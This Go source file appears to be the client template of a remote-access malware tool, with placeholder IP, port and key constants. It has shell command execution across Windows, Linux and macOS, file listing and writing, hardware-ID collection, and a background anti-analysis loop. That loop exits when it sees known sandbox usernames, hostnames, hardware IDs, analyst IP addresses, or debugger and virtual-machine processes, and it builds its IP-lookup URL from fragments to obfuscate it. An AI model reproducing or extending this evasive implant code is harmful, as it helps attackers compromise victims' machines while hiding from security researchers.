package main

import (
	"os"
	"fmt"
	"time"
	"runtime"
	"strings"
	"os/exec"
	"os/user"
	"net/http"
	"io/ioutil"
)

const (
	IP   = "{IP}"
	PORT = "{PORT}"
	KEY  = "{KEY}"
)

var sys = map[string]string{
  "windows": "cmd.exe,/c",
  "linux": "/bin/bash,-c",
  "darwin":"/bin/bash,-c",
}

var sys_hwid = map[string]string{
  "windows": "wmic csproduct get uuid | findstr /v \"UUID\"",
  "linux": "cat /sys/class/dmi/id/product_uuid",
  "darwin":"system_profiler SPHardwareDataType | awk '/UUID/ { print $3 }",
}

var users = []string {
	"WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex",
	"JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq",
	"Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A",
	"lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl", "JohnDoe",
}
var computers = []string {
	"BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4",
	"DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET",
	"SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R",
	"WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ",
	"DESKTOP-5OV9S0O", "QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH", "HAL9TH",
}

var hwids = []string {
	"7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009",
	"11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
	"4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-000000000000",
	"5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022",
	"777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF",
	"00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C",
	"67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
	"44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
	"49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
	"79AF5279-16CF-4094-9758-F88A616D81B4",
}

var addrs = []string {
	"88.132.231.71","78.139.8.50","20.99.160.173","88.153.199.169","84.147.62.12",
	"194.154.78.160","92.211.109.160","195.74.76.222","188.105.91.116","34.105.183.68",
	"92.211.55.199","79.104.209.33","95.25.204.90","34.145.89.174","109.74.154.90",
	"109.145.173.169","34.141.146.114","212.119.227.151","195.239.51.59","192.40.57.234",
	"64.124.12.162","34.142.74.220","188.105.91.173","109.74.154.91","34.105.72.241",
	"109.74.154.92","213.33.142.50",
}

var process = []string {
	"HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe","joeboxcontrol.exe",
    	"httpdebuggerui.exe", "vboxservice.exe", "df5serv.exe","processhacker.exe",
	"vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", 
	"vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", 
	"vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe",
	"ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe","pestudio.exe","x32dbg.exe",
}

func trim(s string) string {
    return strings.TrimSpace(strings.Trim(s, "\n"))
}
func in_array(val string, objects []string) (bool){
	for _,value := range objects {
	    if val == value{
		return true
	    }
	}
	return false
}
func anti_evasions()(bool){
	User, err := user.Current()
  	if err != nil {
    	return true
   	}
   	Name, err := os.Hostname()
	if err != nil {
		return true
	}
   	if in_array(User.Username, users){ // blocked list usernames
   		return true
   	}
   	if in_array(Name, computers){ // blocked list Computers
   		return true
   	}
   	if in_array(trim(system(sys_hwid[runtime.GOOS])), hwids){ // blocked list hwrd (need fix)
   		return true
   	}
   	if in_array(my_ip(), addrs){ // bloacked list ip
   		return true
   	}
   	return false
}

func anti_debugger()(bool){

	return false
}
func my_ip()(string){
	url := "h" + "tt" + "ps" + "://" + "a" + "pi." + "ip" + "ify." + "org/"
	resp, err := http.Get(url)
   	if err != nil {
    	return "213.33.142.50"
   	}
   	body, err := ioutil.ReadAll(resp.Body)
   	if err != nil {
      return "213.33.142.50"
   	}
   	return string(body)
}
func system(todo string) (string) {
	call_os := strings.Split(sys[runtime.GOOS], ",")
	if todo[:2] == "cd" {
		os.Chdir(todo[3:])
		newDir, err := os.Getwd()
	    if err != nil {
        	return err.Error()
    	}
	    return newDir
	}
	out, err := exec.Command(call_os[0], call_os[1], todo).Output()
    if err != nil {
        	return err.Error()
    }
    return string(out)
}
func broswer(path string) []string {
	list_files := []string {}
	if path[len(path)-1:len(path)] != "/" {
		path += "/"
	}
	files, err := ioutil.ReadDir(path)
    if err != nil {
    	return [] string {err.Error()}
    }
    for _, f := range files {
		f.Name()
        list_files = append(list_files, path + f.Name())
    }
    return list_files
}
func write_file(path string, context string) (string) {
    err := os.WriteFile(path, []byte(context), 0644)
	if err != nil {
        return err.Error()
    }
    return path
}
func debugger(){
    for true {
        if anti_evasions(){
	    os.Exit(3)
	}
	if anti_debugger(){
	    os.Exit(3)
	}
}
}
func init(){
    go debugger()
}
func main(){
    //go debugger()
    fmt.Println(system("whoami"));
    time.Sleep(60 * time.Second)
}
